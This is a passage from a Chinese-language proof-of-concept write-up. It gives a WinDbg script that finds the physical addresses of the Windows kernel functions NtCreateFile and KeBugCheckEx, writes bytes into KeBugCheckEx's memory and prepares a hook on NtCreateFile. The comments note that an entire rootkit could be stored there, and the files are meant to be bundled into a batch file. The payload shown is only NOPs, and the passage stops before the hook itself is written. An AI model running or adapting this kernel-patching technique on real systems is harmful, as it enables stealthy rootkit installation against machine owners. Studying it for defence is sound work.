    dbghelp.dll
    kdexts.dll
    kext.dll
    symsrv.dll
    symsrv.yes
    windbg.exe
我们将这些文件嵌入到批处理文件中，然后将它们一起转储到脚本文件中，最后使用脚本执行windbg。 执行脚本后，nt!NtCreateFile函数将被挂接。
我们已经使用nt！KeBugCheckEx的内存空间保存了自己的代码，为了调用我们存放在nt!KeBugCheckEx中的代码，可以挂接一个针对nt!NtCreateFile的调用。通过我们存放在nt!KeBugCheckEx中的代码，可以跳转到调用的原始目的地，所以函数被挂接，以便执行我们的代码，但系统不会出现任何问题。
    Jmpkernel_hookcreatefile.wdbg:
    .load kext.dll
    .load kdexts.dll
    .block
    {
     $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
     $$ Get the Physical Adress of NtCreateFile
     $$
     $$ get the address of nt!NtCreateFile 
     ? nt!NtCreateFile
     $$ @$exp contains the address of NtCreateFile, so we create a alias for it
     aS /x va @$exp
     .block
     {
       $$ get the physical address of NtCreateFile
       !vtop 0 va
       $$ parse the results of vtop
       r @$t1 = 0
       .foreach (tok { !vtop 0 va })
       { 
         .catch 
         { 
           .printf "tok"
           .printf "n"
           .if(@$t1==1)
           { 
             r @$t1 = ${tok}
             .break
           }
           $$ in the results of vtop, when we find "phys" token, after it, it comes the physical address
           .if($spat("${tok}","phys"))
           { 
             r @$t1 = 1
           }
         }
       }
     } 
     ad va
     $$ after parsing vtop results we keep the physical address in @$t1, we create a alias
     aS /x phaNtCreateFile @$t1
     $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
     $$ Get the Physical Adress of KeBugCheckEx
     $$
     $$ get the address of nt!KeBugCheckEx 
     ? nt!KeBugCheckEx
     $$ @$exp contains the address of KeBugCheckEx, so we create a alias for it
     aS /x va @$exp
     .block
     {
       $$ get the physical address of KeBugCheckEx
       !vtop 0 va
       $$ parse the results of vtop
       r @$t1 = 0
       .foreach (tok { !vtop 0 va })
       { 
         .catch 
         { 
           .printf "tok"
           .printf "n"
           .if(@$t1==1)
           { 
             r @$t1 = ${tok}
             .break
           }
           $$ in the results of vtop, when we find "phys" token, after it, it comes the physical address
           .if($spat("${tok}","phys"))
           { 
             r @$t1 = 1
           }
         }
       }
     } 
     ad va
     $$ after parsing vtop results we keep the physical address in @$t1, we create a alias
     aS /x phaKeBugCheckEx @$t1
     $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
     $$ Write our code to KeBugCheckEx (we will use the memory space of this function coz it wont be called unless
     $$ the system crashes)
     $$
     .block
     {
       .printf "nt!NtCreateFile physical address %pn", phaNtCreateFile
       .printf "nt!NtKeyBugCheck physical address %pn", phaKeBugCheckEx
       $$ now we are going to write our code to KeBugCheckEx. It's only some simple nops operations for the PoC, 
       $$ but we could find enough space to write an entire rootkit
       !eb phaKeBugCheckEx 90 90 90 90 90 90 90 90 
       $$ Now lets see the code of nt!NtCreateFile in the target system (win 8.1 x64 ntoskrnl version is 6.3.9600.17668)
       $$
       $$ nt!NtCreateFile:
       $$ fffff803f846020 4c8bdc mov r11,rsp
       $$ fffff803f846023 4881ec88000000 sub rsp,88h
       $$ fffff803f84602a 33c0 xor eax,eax
       $$ fffff803f84602c 498943f0 mov qword ptr [r11-10h],rax
       $$ fffff803f846030 c744247020000000 mov dword ptr [rsp+70h],20h
       $$ fffff803f846038 89442468 mov dword ptr [rsp+68h],eax
       $$ fffff803f84603c 498943d8 mov qword ptr [r11-28h],rax
       $$ fffff803f846040 89442458 mov dword ptr [rsp+58h],eax
       $$ fffff803f846044 8b8424e0000000 mov eax,dword ptr [rsp+0E0h]
       $$ fffff803f84604b 89442450 mov dword ptr [rsp+50h],eax
       $$ fffff803f84604f 488b8424d8000000 mov rax,qword ptr [rsp+0D8h]
       $$ fffff803f846057 498943c0 mov qword ptr [r11-40h],rax
       $$ fffff803f84605b 8b8424d0000000 mov eax,dword ptr [rsp+0D0h]
       $$ fffff803f846062 89442440 mov dword ptr [rsp+40h],eax
       $$ fffff803f846066 8b8424c8000000 mov eax,dword ptr [rsp+0C8h]
       $$ fffff803f84606d 89442438 mov dword ptr [rsp+38h],eax
       $$ fffff803f846071 8b8424c0000000 mov eax,dword ptr [rsp+0C0h]
       $$ fffff803f846078 89442430 mov dword ptr [rsp+30h],eax
       $$ fffff803f84607c 8b8424b8000000 mov eax,dword ptr [rsp+0B8h]
       $$ fffff803f846083 89442428 mov dword ptr [rsp+28h],eax
       $$ fffff803f846087 488b8424b0000000 mov rax,qword ptr [rsp+0B0h]
       $$ fffff803f84608f 49894398 mov qword ptr [r11-68h],rax
       $$ fffff803f846093 e808000000 call nt!IopCreateFile (fffff803ef8460a0)  
您可以通过下面的视频来观看概念验证代码的运行情况：